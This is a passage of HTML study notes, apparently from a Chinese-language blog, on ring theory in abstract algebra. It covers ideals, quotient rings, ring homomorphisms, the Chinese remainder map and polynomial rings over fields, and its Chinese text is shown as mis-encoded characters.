æ•°)</li><li>$(0):=\{0\}=0\mathbb{Z}$:ä¸»ç†æƒ³å’Œç´ ç†æƒ³(ä¸æ˜¯æå¤§ç†æƒ³)</li><li>$(1):=\mathbb{Z}$:ä¸»ç†æƒ³(ä¸æ˜¯ç´ ç†æƒ³ã€æå¤§ç†æƒ³)</li></ul><hr><h2 id="å­åŸŸ-subfield"><a href="#å­åŸŸ-subfield" class="headerlink" title="å­åŸŸ(subfield)"></a>å­åŸŸ(subfield)</h2><p><strong>å®šä¹‰</strong>ï¼š$F$æ˜¯åŸŸï¼Œ$F^\prime$ æ˜¯$F$ çš„<strong>å­ç¯</strong>ã€‚å¦‚æœ$F^\prime$ä¹Ÿæ˜¯åŸŸï¼Œç§°$F^{\prime}$æ˜¯$F$çš„<strong>å­åŸŸ</strong>ï¼Œ$F$ æ˜¯ $F^\prime$ çš„<strong>æ‰©åŸŸ (extension field)</strong>ã€‚</p><h3 id="åŸŸçš„ç†æƒ³"><a href="#åŸŸçš„ç†æƒ³" class="headerlink" title="åŸŸçš„ç†æƒ³"></a>åŸŸçš„ç†æƒ³</h3><p><strong>å®šç†</strong>ï¼šåŸŸæ²¡æœ‰éå¹³å‡¡ç†æƒ³(åªæœ‰é›¶ç†æƒ³å’Œå•ä½ç†æƒ³)</p><p><strong>æ¨è®º</strong>ï¼šé›¶ç†æƒ³æ˜¯åŸŸçš„æå¤§ç†æƒ³</p><p><strong>å®šç†</strong>ï¼šé›¶ç†æƒ³æ˜¯å«å¹ºäº¤æ¢ç¯çš„æå¤§ç†æƒ³ï¼Œå½“ä¸”ä»…å½“ï¼Œè¿™ä¸ªç¯æ˜¯åŸŸ</p><hr><h2 id="å•†ç¯-quotient-ring"><a href="#å•†ç¯-quotient-ring" class="headerlink" title="å•†ç¯(quotient ring)"></a>å•†ç¯(quotient ring)</h2><p>$R$æ˜¯ç¯ï¼Œ$I$æ˜¯$R$çš„ç†æƒ³</p><script type="math/tex; mode=display">(I,+)\xrightarrow{\text{æ­£è§„å­ç¾¤}}(R,+)</script><script type="math/tex; mode=display">(R/I,+):=\{[a]_I\mid a\in R\}</script><script type="math/tex; mode=display">[a]_I=a+I:=\{\begin{array}{c}a+t|t\in I\}\end{array}</script><script type="math/tex; mode=display">[a]_I\cdot[b]_I:=[ab]_I</script><p>åªæœ‰å•ä½ç†æƒ³æ„é€ çš„å•†ç¯æ˜¯å¹³å‡¡çš„</p><p>å•†ç¯ ($R/I,+,\cdot)$</p><p>åˆç§° $R$æ¨¡$I$çš„<strong>å‰©ä½™ç±»ç¯</strong></p><p><strong>åŠ æ³•</strong>ï¼š$[a]_I+[b]_I:=[a+b]_I$</p><p><strong>ä¹˜æ³•</strong>ï¼š$[a]_I\cdot[b]_I:=[ab]_I$</p><p><strong>é›¶å…ƒ</strong>ï¼š$[\theta]_I=\{\theta+t|t\in I\}=\{t\in I\}=I$</p><p><strong>å•ä½å…ƒ</strong>ï¼š$[e]_I=\{e+t|t\in I\}$</p><blockquote><p>ä¾‹ï¼šå•†ç¯$Z_n$$(n$æ˜¯æ­£æ•´æ•°)        </p><p>$Z$æ˜¯ç¯                $nZ$æ˜¯åŒè¾¹ç†æƒ³</p><p>$(nZ,+)$æ˜¯$(Z,+)$çš„æ­£è§„å­ç¾¤</p><p>$(Z_n,+):=(Z/nZ,+)$æ˜¯å•†ç¾¤</p><p>$(Z_n,+,\cdot):=(Z/nZ,+\cdot)$æ˜¯å•†ç¯</p></blockquote><h3 id="åŒè¾¹ç†æƒ³-two-sided-ideal"><a href="#åŒè¾¹ç†æƒ³-two-sided-ideal" class="headerlink" title="åŒè¾¹ç†æƒ³(two-sided ideal)"></a>åŒè¾¹ç†æƒ³(two-sided ideal)</h3><p>å®šä¹‰ï¼š$(R,+,\cdot)$æ˜¯ç¯ï¼Œ$I $æ˜¯$ R$ çš„éç©ºå­é›†ã€‚å¦‚æœ$(I,+,\cdot)$ æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><p>åŠ æ³•å­ç¾¤$:(I,+)$æ˜¯$(R,+)$çš„å­ç¾¤ï¼Œ<br>(ä¹˜æ³•)å¸æ”¶å¾‹ï¼š$\forall r\in R,\forall a\in I\Rightarrow ra,ar\in I$,</p><p>åˆ™ç§°$I$æ˜¯$R$ çš„åŒè¾¹ç†æƒ³ã€‚</p><p><strong>å•è¾¹ç†æƒ³(one-sided ideal)</strong>:å·¦ç†æƒ³ã€å³ç†æƒ³<br><strong>äº¤æ¢ç¯</strong>çš„ç†æƒ³éƒ½æ˜¯<strong>åŒè¾¹ç†æƒ³</strong><br><strong>å•ä½ç†æƒ³</strong>$R$<strong>æ˜¯åŒè¾¹ç†æƒ³</strong></p><h3 id="å•†ç¯çš„ç†æƒ³"><a href="#å•†ç¯çš„ç†æƒ³" class="headerlink" title="å•†ç¯çš„ç†æƒ³"></a>å•†ç¯çš„ç†æƒ³</h3><p>ç†æƒ³æ˜¯ä¸€ç§å­ç¯$\Rightarrow$ å•†ç¯çš„ç†æƒ³æ˜¯å•†ç¯çš„å­ç¯</p><p>$R$æ˜¯ç¯ï¼Œ$I$æ˜¯$R$çš„åŒè¾¹ç†æƒ³ï¼Œ$R/I$æ˜¯ç›¸åº”çš„å•†ç¯<br>$K/I=\{[a_1]_I,[a_2]_I,â€¦\},a_1,a_2\in K$,    $K$æ˜¯$R$çš„åŒè¾¹ç†æƒ³ï¼Œ$I$ æ˜¯$K$ çš„åŒè¾¹ç†æƒ³ã€‚</p><h3 id="something-special"><a href="#something-special" class="headerlink" title="something special"></a>something special</h3><p>$R:$<strong>å«å¹ºäº¤æ¢ç¯</strong></p><ul><li>å®šç†1ï¼š$I$ æ˜¯<strong>ç´ ç†æƒ³</strong>$\Leftrightarrow R/I$ æ˜¯<strong>æ•´ç¯</strong></li><li>å®šç†2ï¼š$I$ æ˜¯<strong>æå¤§ç†æƒ³</strong>$\Leftrightarrow R/I$ æ˜¯<strong>åŸŸ</strong>(åŸŸæ˜¯æ•´ç¯)</li><li>å®šç†3ï¼š$M$æ˜¯æå¤§ç†æƒ³$\Longrightarrow M$æ˜¯ç´ ç†æƒ³</li><li>å•†ç¯$R/I:$é›¶å…ƒ$[\theta]_I=I$,å•ä½å…ƒ$[e]_I=e+I$$(R/I$æ˜¯éå¹³å‡¡çš„å«å¹ºäº¤æ¢ç¯)</li></ul><hr><h2 id="ç¯åŒæ€"><a href="#ç¯åŒæ€" class="headerlink" title="ç¯åŒæ€"></a>ç¯åŒæ€</h2><p><strong>å®šä¹‰</strong>ï¼š$(R,+,\cdot)å’Œ(R^{\prime},\oplus,\odot)æ˜¯ç¯ï¼Œ\forall a,b\in R,å‡½æ•°$</p><p>$f{:}R \to R^{\prime}$æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><script type="math/tex; mode=display">f(a+b)=f(a)\oplus f(b)$$    $((R,+)\text{åˆ°}(R^{\prime},\oplus)\text{çš„åŠ æ³•ç¾¤åŒæ€})$$$f(a\cdot b)=f(a)\odot f(b)</script><p>åˆ™ç§°$f$ä¸º$R$åˆ°$R^\prime$çš„ç¯åŒæ€</p><p>$åŒæ€æ ¸\operatorname{Ker}f:=\{a\in R|f(a)=\theta^{\prime}(Râ€™çš„é›¶å…ƒ)\}$</p><p>$\text{æ‰©å±•:}S:=R\Longrightarrow f(R)=Imfï¼ŒIm f\text{æ˜¯}R^{\prime}\text{çš„å­ç¯}$</p><p>$æ‰©å±•ï¼šS^\prime:=\{\theta^{\prime}\}\Rightarrow f^{-1}(S^{\prime})=f^{-1}(\{\theta^{\prime}\})=Kerf,åŒæ€æ ¸Ker fæ˜¯Rçš„å­ç¯$</p><p>$æ‰©å±•ï¼šI^\prime:=\{\theta^{\prime}\}\Longrightarrow f^{-1}(I^{\prime})=f^{-1}(\{\theta^{\prime}\})=Kerf,åŒæ€æ ¸Kerfæ˜¯Rçš„ç†æƒ³$</p><p>åŒæ€æ ¸æ˜¯åŒè¾¹ç†æƒ³</p><hr><p>è®¾$f{:}R\to R^{\prime}$æ˜¯ç¯åŒæ€ï¼š</p><p><strong>å®šç†1</strong>ï¼šç¯åŒæ€æ˜¯å•å°„$\Leftrightarrow Kerf=\{\boldsymbol{\theta}\}$<br><strong>å®šç†2</strong>ï¼šç¯åŒæ€æ˜¯æ»¡å°„$\Leftrightarrow I\boldsymbol{m}f=R^\prime$</p><hr><p>è®¾$f:R\to R^{\prime}$æ˜¯ç¯åŒæ€ï¼Œ$\forall a\in R:$<br><strong>æ€§è´¨1</strong>ï¼š$f(ka)=k f(a),k\in \mathbb{Z}$<br><strong>æ€§è´¨2</strong>ï¼š$f(a^k)=f(a)^k,k\in\mathbb{N}$</p><hr><p>$fæ˜¯æ»¡åŒæ€,Ræ˜¯å«å¹ºç¯:$</p><p>æ€§è´¨3$:f(a^k)=f(a)^k,\quad k\in Z,\quad a\text{æœ‰ä¹˜æ³•é€†å…ƒ}$<br>æ€§è´¨4$:f(e)=e^{\prime},\quad e^{\prime}\text{æ˜¯}R^{\prime}çš„å•ä½å…ƒ$</p><hr><p>ç¯çš„ç†æƒ³å¯¹åº”åŒæ€åƒçš„ç†æƒ³ï¼ŒåŒæ€åƒçš„ç†æƒ³åç©¿è¶Šåä¸€å®šæ˜¯å®šä¹‰åŸŸçš„ç†æƒ³ã€‚</p><h3 id="ç¯åŒæ€çš„å¤åˆ"><a href="#ç¯åŒæ€çš„å¤åˆ" class="headerlink" title="ç¯åŒæ€çš„å¤åˆ"></a>ç¯åŒæ€çš„å¤åˆ</h3><p><strong>å®šç†</strong>ï¼š$f$æ˜¯$R$åˆ°$R^\prime$çš„ç¯åŒæ€ï¼Œ$f^\prime$æ˜¯$R^{\prime}$åˆ°$Râ€™â€™$çš„ç¯åŒæ€ï¼Œåˆ™$f$å’Œ$f^\prime$çš„å¤åˆ<script type="math/tex">f^{\prime}\circ f{:}R\to R^{\prime\prime}</script>ä¹Ÿæ˜¯ç¯åŒæ€</p><h3 id="åµŒå…¥æ˜ å°„"><a href="#åµŒå…¥æ˜ å°„" class="headerlink" title="åµŒå…¥æ˜ å°„"></a>åµŒå…¥æ˜ å°„</h3><p><img src="/2024/08/09/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%8E%AF%E8%AE%BA/image-20240814163834046.png" alt="image-20240814163834046"></p><h3 id="è‡ªç„¶æ˜ å°„"><a href="#è‡ªç„¶æ˜ å°„" class="headerlink" title="è‡ªç„¶æ˜ å°„"></a>è‡ªç„¶æ˜ å°„</h3><p><img src="/2024/08/09/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%8E%AF%E8%AE%BA/image-20240814163850181.png" alt="image-20240814163850181"></p><h3 id="ä¾‹"><a href="#ä¾‹" class="headerlink" title="ä¾‹"></a>ä¾‹</h3><p><img src="/2024/08/09/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%8E%AF%E8%AE%BA/image-20240814163906444.png" alt="image-20240814163906444"></p><hr><h2 id="å•ä½-unit"><a href="#å•ä½-unit" class="headerlink" title="å•ä½(unit)"></a>å•ä½(unit)</h2><p>æœ‰<strong>ä¹˜æ³•é€†å…ƒ</strong>çš„å…ƒç´ ç§°ä¸º<strong>å•ä½</strong></p><p>å®šä¹‰ï¼šè®¾ç¯$R,a\in R$æ˜¯ï¼Œå¦‚æœ$\exists b\in R$,ä½¿å¾—<script type="math/tex">ab=ba=e,</script>åˆ™ç§°$a$ä¸º<strong>å•ä½</strong></p><h3 id="å•ä½ç¾¤-group-of-units"><a href="#å•ä½ç¾¤-group-of-units" class="headerlink" title="å•ä½ç¾¤(group of units)"></a>å•ä½ç¾¤(group of units)</h3><p>å®šä¹‰ï¼š</p><p>è®¾ç¯$R$,ç§°</p><script type="math/tex; mode=display">R^*:=\{a|a\in R,a æ˜¯å•ä½\}</script><p>ä¸º<strong>Rçš„å•ä½ç¾¤</strong>ã€‚</p><p>$R^*$ æ˜¯ä¹˜æ³•ç¾¤ï¼Œå•ä½å…ƒæ˜¯$e (e\in R)$</p><p>$Z_n^*{:}Z_n\text{çš„å•ä½ç¾¤}$</p><h2 id="ç¯åŒæ„-ring-isomorphism"><a href="#ç¯åŒæ„-ring-isomorphism" class="headerlink" title="ç¯åŒæ„(ring isomorphism)"></a><strong>ç¯åŒæ„</strong>(ring isomorphism)</h2><ul><li>åŒå°„(å•å°„&amp;æ»¡å°„)</li><li>ç¯åŒæ€</li></ul><p>$R$ä¸ $R^{\prime }$åŒæ„ï¼Œè®°ä¸º$R\cong R^\prime$<br>$R$ä¸$R$ä¹‹é—´çš„åŒæ„ï¼šç¯è‡ªåŒæ„(ring automorphism)</p><h3 id="ç¯-ç¬¬ä¸€åŒæ„å®šç†-first-isomorphism-theorem"><a href="#ç¯-ç¬¬ä¸€åŒæ„å®šç†-first-isomorphism-theorem" class="headerlink" title="(ç¯)ç¬¬ä¸€åŒæ„å®šç†(first isomorphism theorem)"></a>(ç¯)ç¬¬ä¸€åŒæ„å®šç†(first isomorphism theorem)</h3><p>å®šç†ï¼šè®¾ç¯$R$å’Œ$R^\prime,f{:}R\to R^\prime$æ˜¯ç¯åŒæ€(åŒæ€æ ¸æ˜¯$Kerf$,åŒæ€åƒæ˜¯$Imf$),åˆ™</p><script type="math/tex; mode=display">R/Kerf\cong Imf</script><script type="math/tex; mode=display">\rho:\quad[a]_{Kerf}\quad f(a)</script><p>$\rho^{\prime}:R/Kerf\to R^{\prime}\text{ å•ä¸€åŒæ€}$</p><h3 id="ä¸­å›½å‰©ä½™æ˜ å°„"><a href="#ä¸­å›½å‰©ä½™æ˜ å°„" class="headerlink" title="ä¸­å›½å‰©ä½™æ˜ å°„"></a>ä¸­å›½å‰©ä½™æ˜ å°„</h3><p>ç¯åŒæ€   $f{:}Z\to Z_{n_1}\times\cdotp\cdotp\cdotp\times Z_{n_m}$</p><script type="math/tex; mode=display">a\quad f(a)=([a]_{n_1},...,[a]_{n_m})</script><script type="math/tex; mode=display">n_i|a\Leftrightarrow[a]_{n_i}=[0]_{n_i}</script><script type="math/tex; mode=display">n_1|a,...,n_m|a\Leftrightarrow([a]_{n_1},...,[a]_{n_m})=([0]_{n_1},...,[0]_{n_m})</script><p>$\Leftrightarrow a\in Kerf$<br>$\Leftrightarrow a\in nZ\Leftrightarrow nZ=Kerf$</p><p>ç¯åŒæ„(ä¸­å›½å‰©ä½™æ˜ å°„)<script type="math/tex">\rho{:}Z_n\to Z_{n_1}\times\cdotp\cdotp\cdotp\times Z_{n_m}</script><br>$[ a]$ $\rho ( a) = \left ( [ a] _{n_1}, . . . , [ a] _{n_m}\right ) ( = f( a) )$</p><hr><p>ç¯åŒæ„$\rho{:}R\to R^{\prime}$<br>(ä¹˜æ³•)ç¾¤åŒæ„<script type="math/tex">\overline {\boldsymbol{\rho }}{: }R^* \to R^{\prime * }</script> <script type="math/tex">(R ^* \cong R ^{\prime * })</script></p><hr><p>(ä¸­å›½å‰©ä½™æ˜ å°„)<script type="math/tex">\rho{:}Z_n\to Z_{n_1}\times\cdotp\cdotp\cdotp\times Z_{n_m}</script><br>(ä¹˜æ³•)ç¾¤åŒæ„<script type="math/tex">Z_n^*\cong Z_{n_1}^*\times\cdots\times Z_{n_m}^*</script><br>$[a]\quad([a]_{n_1},â€¦,[a]_{n_m})$</p><hr><h2 id="å¤šé¡¹å¼ç¯-polynomial-ring"><a href="#å¤šé¡¹å¼ç¯-polynomial-ring" class="headerlink" title="å¤šé¡¹å¼ç¯(polynomial ring)"></a>å¤šé¡¹å¼ç¯(polynomial ring)</h2><h3 id="å¤šé¡¹å¼-polynomial"><a href="#å¤šé¡¹å¼-polynomial" class="headerlink" title="å¤šé¡¹å¼(polynomial)"></a>å¤šé¡¹å¼(polynomial)</h3><p>$f(x)=\sum_{i=0}^ka_ix^i=a_0+a_1x+\cdots+a_kx^k$</p><p>$a_0,a_1,â€¦,a_k\in R$</p><p>$xä¸ºä¸å®šå…ƒï¼Œa_iä¸ºç³»æ•°ï¼Œa_0å¸¸æ•°é¡¹ï¼Œa_ké¦–é¡¹ç³»æ•°ï¼Œkä¸ºéè´Ÿæ•´æ•°å«å¤šé¡¹å¼çš„åº¦(deg(f(x)))$</p><h3 id="å¤šå½¢å¼ç¯-polynomial-ring"><a href="#å¤šå½¢å¼ç¯-polynomial-ring" class="headerlink" title="å¤šå½¢å¼ç¯(polynomial ring)"></a>å¤šå½¢å¼ç¯(polynomial ring)</h3><p><strong>å®šä¹‰</strong>ï¼šæ‰€æœ‰å…³äºä¸å®šå…ƒ$x$ã€ç³»æ•°å±äºç¯$R$çš„å¤šé¡¹å¼<br>$f(x)=a_0+a_1x+\cdots+a_kx^k$</p><script type="math/tex; mode=display">a_0,a_1,...a_k\in R</script><p>å½¢æˆçš„ç¯ï¼Œç§°ä¸º$R$ä¸Šçš„<strong>å¤šé¡¹å¼ç¯</strong>ï¼Œè®°ä¸º$R[X]$ã€‚</p><p>$R$å«$R[X]$çš„<strong>åŸºç¯(base ring)</strong>ã€‚</p><script type="math/tex; mode=display">\begin{aligned}&f(x)=a_0+a_1x+\cdots+a_kx^k\\&g(x)=b_0+b_1x+\cdots+b_mx^m\\&\text{åŠ æ³•:}f(x)+g(x)=c_0+\cdots+c_t\cdot x^t\\&t=max(k,m)\\&c_{i}=a_{i}+b_{i}, i=0,1,...,t\\&\text{ä¹˜æ³•:}f(x)g(x)=c_0+\cdots+c_t\cdot x^t\\&t=k+m\\&c_{s}=\sum_{i=0}^{s}a_{i}b_{s-i}, s=0,1,...,t\end{aligned}</script><p><strong>æ³¨æ„</strong>ï¼š<script type="math/tex">f(x)g(x)\text{åœ¨}b\text{çš„å–å€¼æœªå¿…ç­‰äº}f(b)g(b)(ä¹˜æ³•äº¤æ¢å¾‹)</script></p><h3 id="å¤šé¡¹å¼é™¤æ³•-polynomial-division"><a href="#å¤šé¡¹å¼é™¤æ³•-polynomial-division" class="headerlink" title="å¤šé¡¹å¼é™¤æ³•(polynomial division)"></a>å¤šé¡¹å¼é™¤æ³•(polynomial division)</h3><p>è®¾åŸŸ$F,f(x),g(x)\in F[X],g(x)\neq\theta$ã€‚å­˜åœ¨å”¯ä¸€çš„$q(x),r(x)\in F[X]$,ä½¿å¾—<br><script type="math/tex">f(x)=q(x)g(x)+r(x),\quad deg(r(x))<deg(g(x))</script></p><h3 id="ä¸€äº›æ€§è´¨"><a href="#ä¸€äº›æ€§è´¨" class="headerlink" title="ä¸€äº›æ€§è´¨"></a>ä¸€äº›æ€§è´¨</h3><script type="math/tex; mode=display">f(x)=a_0+a_1x+\cdots+a_kx^kï¼›\quad g(x)=b_0+b_1x+\cdots+b_mx^m</script><script type="math/tex; mode=display">deg(f(x)+g(x))\leq max(deg(f(x)),deg(g(x)))\\deg(f(x)g(x))\leq deg(f(x))+deg(g(x))</script><script type="math/tex; mode=display">f(x)g(x)=a_0b_0+\cdots+a_kb_mx^{k+m}</script><p>$R$æ˜¯æ•´ç¯ï¼Œåˆ™<script type="math/tex">deg(f(x)g(x))=deg(f(x))+deg(g(x))</script></p><hr><p>$R=\{\theta\}\Leftrightarrow R[X]=\{\theta\}$<br>$S$æ˜¯$R$çš„å­ç¯$\Leftrightarrow S[X]$æ˜¯$R[X]$çš„å­ç¯<br>$R$ æ˜¯å«å¹ºç¯$\Leftrightarrow R[X]$æ˜¯å«å¹ºç¯ (å•ä½å…ƒéƒ½æ˜¯$e)$<br>$R$ æ˜¯äº¤æ¢ç¯$\Leftrightarrow R[X]$ æ˜¯äº¤æ¢ç¯<br>$R$ æ˜¯æ•´ç¯$\Longrightarrow R[X]$ æ˜¯æ•´ç¯<br>$F$ æ˜¯åŸŸ$\Longrightarrow F[X]$ æ˜¯æ•´ç¯$(F[X]$ä¸æ˜¯åŸŸ)</p><h3 id="å¸¸æ•°å¤šé¡¹å¼-constant-polynomial"><a href="#å¸¸æ•°å¤šé¡¹å¼-constant-polynomial" class="headerlink" title="å¸¸æ•°å¤šé¡¹å¼ (constant polynomial)"></a>å¸¸æ•°å¤šé¡¹å¼ (constant polynomial)</h3><p>$a\in R$å¯ä»¥çœ‹æˆåªæœ‰å¸¸æ•°é¡¹çš„å¤šé¡¹å¼</p><script type="math/tex; mode=display">a=a+\theta x+\cdots+\theta x^k,</script><p>ç§°ä¸ºå¸¸æ•°å¤šé¡¹å¼ã€‚<br>$R$æ˜¯$R[X]$çš„å­ç¯    $R[X]$ çš„é›¶å…ƒï¼šé›¶å¤šé¡¹å¼$\theta$</p><h3 id="é¦–ä¸€å¤šé¡¹å¼"><a href="#é¦–ä¸€å¤šé¡¹å¼" class="headerlink" title="é¦–ä¸€å¤šé¡¹å¼"></a>é¦–ä¸€å¤šé¡¹å¼</h3><p><strong>å®šä¹‰</strong>ï¼šè®¾ $R$æ˜¯å«ä¹ˆç¯ï¼Œ$f(x)\in R[X],f(x)$çš„é¦–é¡¹ç³»æ•°æ˜¯å•ä½å…ƒ$e$,$f(x)$å«é¦–ä¸€å¤šé¡¹å¼ã€‚<br>ä¾‹ï¼šè®¾$a,b\in F$,åˆ™$a+bx+x^2$ æ˜¯é¦–ä¸€å¤šé¡¹å¼ï¼Œå› ä¸ºé¦–é¡¹ç³»æ•°(æœ€é«˜é¡¹$x^2$çš„ç³»æ•°)ä¸º$e$</p><p>$f(x)\in F[X],f(x)$çš„é¦–é¡¹ç³»æ•°æ˜¯$a_k,g(x)=a_k^{-1}\cdot f(x)$,åˆ™$g(x)$æ˜¯é¦–ä¸€å¤šé¡¹å¼<br>æ˜“çŸ¥ï¼Œ$deg(f(x))=deg(g(x))$</p><h3 id="åŸŸä¸Šå¤šé¡¹å¼"><a href="#åŸŸä¸Šå¤šé¡¹å¼" class="headerlink" title="åŸŸä¸Šå¤šé¡¹å¼"></a>åŸŸä¸Šå¤šé¡¹å¼</h3><ul><li>åŸŸ$F$</li><li>å¤šé¡¹å¼ç¯$F[X]$</li></ul><h3 id="æœ€å¤§å…¬å› å¼"><a href="#æœ€å¤§å…¬å› å¼" class="headerlink" title="æœ€å¤§å…¬å› å¼"></a>æœ€å¤§å…¬å› å¼</h3><p><strong>å®šç†</strong>ï¼šè®¾åŸŸ$F,f_1(x),â€¦,f_n(x)\in F[X]$,$\exists f_i(x)\neq\theta(1\leq i\leq n)$ã€‚<br>$å­˜åœ¨å”¯ä¸€çš„é¦–ä¸€å¤šé¡¹å¼d(x)\in F[X]$,ä½¿å¾—<br>$d(x)|f_1(x),â€¦,d(x)|f_n(x)$<br>$\forall c(x)\in F[X],c(x)|f_1(x),â€¦,c(x)|f_n(x)$,åˆ™$c(x)|d(x)$<br>$d(x)$ç§°ä¸º $f_1(x),â€¦,f_n(x)$ çš„<strong>æœ€å¤§å…¬å› å¼</strong></p><p>å¿…ç„¶å­˜åœ¨$b_1(x),â€¦,b_n(x)\in F[X]$,æœ‰</p><script type="math/tex; mode=display">d(x)=b_1(x)f_1(x)+\cdots+b_n(x)f_n(x)</script><p>å¦‚æœ $gcd(f_1(x),â€¦,f_n(x))=e$,ç§°$f_1(x),â€¦,f_n(x)$<strong>äº’ç´ </strong></p><script type="math/tex; mode=display">gcd(f_1(x),...,f_n(x))=gcd(gcd(f_1(x),f_2(x)),...,f_n(x))</script><h4 id="å¤šé¡¹å¼ä¸Šçš„æ¬§å‡ é‡Œå¾—ç®—æ³•"><a href="#å¤šé¡¹å¼ä¸Šçš„æ¬§å‡ é‡Œå¾—ç®—æ³•" class="headerlink" title="å¤šé¡¹å¼ä¸Šçš„æ¬§å‡ é‡Œå¾—ç®—æ³•"></a>å¤šé¡¹å¼ä¸Šçš„æ¬§å‡ é‡Œå¾—ç®—æ³•</h4><p>æ±‚$f(x),g(x)\in F[X]$çš„æœ€å¤§å…¬å› å¼<br>$f\left(x\right)=q_{1}\left(x\right)g\left(x\right)+r_{1}\left(x\right)$<br>$g(x)=q_{2}(x)r_{1}(x)+r_{2}(x)$<br>$r_{1}(x)=q_{3}(x)r_{2}(x)+r_{3}(x)$<br>â€¦â€¦<br>$r_{n-2}(x)=q_n(x)r_{n-1}(x)+r_n(x)$<br>$r_{n-1}(x)=q_{n+1}(x)r_n(x)$</p><script type="math/tex; mode=display">\text{è®¾ }r_n(x)\text{é¦–é¡¹ç³»æ•°ä¸º }a_k(\neq e)\\gcd(f(x),g(x))=a_k^{-1}\cdot r_n(x)</script><h3 id="æœ€å°å…¬å€å¼"><a href="#æœ€å°å…¬å€å¼" class="headerlink" title="æœ€å°å…¬å€å¼"></a>æœ€å°å…¬å€å¼</h3><p><strong>å®šç†</strong>ï¼šè®¾åŸŸ$F,f_1(x),â€¦,f_n(x)\in F[X],\forall f_i(x)\neq\theta (1\leq i\leq n$)ã€‚å­˜åœ¨<strong>å”¯ä¸€</strong>çš„<strong>é¦–ä¸€å¤šé¡¹å¼</strong>$m(x)\in F[X]$,ä½¿å¾—<br>$f_1(x)|\boldsymbol{m}(x),â€¦,f_n(x)|\boldsymbol{m}(x)$<br>$\forall c(x)\in F[X],f_1(x)|c(x),â€¦,f_n(x)|c(x)$,åˆ™$m(x)|c(x)$<br>$m(x)$ç§°ä¸º$f_1(x),â€¦,f_n(x)$çš„<strong>æœ€å°å…¬å€å¼</strong></p><script type="math/tex; mode=display">\begin{aligned}&\text{éé›¶å¤šé¡¹å¼}f(x),g(x)\in F[X]\text{,åˆ™}\\&a_k^{-1}\cdot f(x)g(x)=lcm(f(x),g(x))\cdot gcd(f(x),g(x)),\\&\text{å…¶ä¸­,}a_k\text{ æ˜¯}f(x)g(x)\text{çš„é¦–é¡¹ç³»æ•°}\end{aligned}</script><script type="math/tex; mode=display">lcm(f_1(x),...,f_n(x))=lcm(lcm(f_1(x),f_2(x)),...,f_n(x))$$</script><h3 id="å¤šé¡¹å¼ç¯çš„ç†æƒ³"><a href="#å¤šé¡¹å¼ç¯çš„ç†æƒ³" class="headerlink" title="å¤šé¡¹å¼ç¯çš„ç†æƒ³"></a>å¤šé¡¹å¼ç¯çš„ç†æƒ³</h3><p>åŠ æ³•å­ç¾¤â†’ç†æƒ³</p><ul><li>ç¯$Z$:åŠ æ³•å­ç¾¤$(mZ,+)\to$ç†æƒ³$(Z,+,\times)$</li><li>ç¯$Z_n$:åŠ æ³•å­ç¾¤ ($mZ_n,+)\to$ç†æƒ³ ($mZ_n,+,\times)$</li></ul><p><strong>å®šç†</strong>:$è®¾a\in R\text{,åˆ™ }J=\{g(x)\in R[X]|g(\alpha)=\theta\}\text{æ˜¯}R[X]çš„ç†æƒ³ã€‚$</p><p><strong>å®šç†</strong>ï¼š$F[X]$ æ˜¯ä¸»ç†æƒ³æ•´ç¯ã€‚$F[X]$çš„æ¯ä¸ªéé›¶ç†æƒ³$J$,éƒ½å­˜åœ¨å”¯ä¸€çš„é¦–ä¸€å¤šé¡¹å¼$g(x)\in F[X]$,æœ‰$J=(g(x))$ã€‚(ç†æƒ³éƒ½æ˜¯ä¸»ç†æƒ³çš„æ•´ç¯ï¼Œç§°ä¸»ç†æƒ³æ•´ç¯)</p><p>$F[X]$ æ˜¯ä¸»ç†æƒ³æ•´ç¯$\Longrightarrow F[X]$ çš„ç†æƒ³éƒ½æ˜¯ä¸»ç†æƒ³<br>$F[X]$çš„ç†æƒ³éƒ½å¯ä»¥å†™æˆ $(f(x))$ çš„å½¢å¼ï¼Œ$f(x)\in F[X]$</p><script type="math/tex; mode=display">\begin{aligned}\left(f(x)\right)&=\{f(x)c(x)\mid c(x)\in F[X]\}\\&=\{c(x)f(x)\mid c(x)\in F[X]\}\end{aligned}</script><p>$\exists g( x) \in F[ X]$, $g( x)$æ˜¯å”¯ä¸€çš„é¦–ä¸€å¤šé¡¹å¼ï¼Œä½¿$\left(f(x)\right)=\left(g(x)\right)$</p><h3 id="ä¸å¯çº¦å¤šé¡¹å¼-irreducible-polynomial"><a href="#ä¸å¯çº¦å¤šé¡¹å¼-irreducible-polynomial" class="headerlink" title="ä¸å¯çº¦å¤šé¡¹å¼ (irreducible polynomial)"></a>ä¸å¯çº¦å¤šé¡¹å¼ (irreducible polynomial)</h3><p><strong>å®šä¹‰</strong>ï¼šè®¾åŸŸ$F$,$p(x)\in F[X]$ã€‚å¦‚æœ$deg(p(x))&gt;0$,$p(x)=$ $b(x)c(x)$,åˆ™$deg(b(x))=0$æˆ–$deg(c(x))=0$(å…¶ä¸­ä¸€ä¸ªæ˜¯å¸¸æ•°å¤šé¡¹å¼),ç§°$p(x)$åœ¨$F$ä¸Šä¸å¯çº¦çš„(åˆç§°åœ¨ $F[X]$é‡Œä¸å¯çº¦çš„æˆ–ç´ çš„)</p><h4 id="F-X-ä¸­çš„å”¯ä¸€åˆ†è§£"><a href="#F-X-ä¸­çš„å”¯ä¸€åˆ†è§£" class="headerlink" title="$F[X]$ä¸­çš„å”¯ä¸€åˆ†è§£"></a>$F[X]$ä¸­çš„å”¯ä¸€åˆ†è§£</h4><p><strong>å®šç†</strong>ï¼š$\forall g(x)\in F[X]$, $deg(g(x))&gt;0$,åˆ™$g(x)$å¯å”¯ä¸€åœ°å†™æˆå¦‚ä¸‹<strong>å½¢å¼</strong>ï¼š</p><script type="math/tex; mode=display">g(x)=ap_1^{e_1}(x)p_2^{e_2}(x)...p_k^{e_k}(x),</script><p>å…¶ä¸­ï¼Œ$a\in F,p_1(x),p_2(x),â€¦,p_k(x)\in 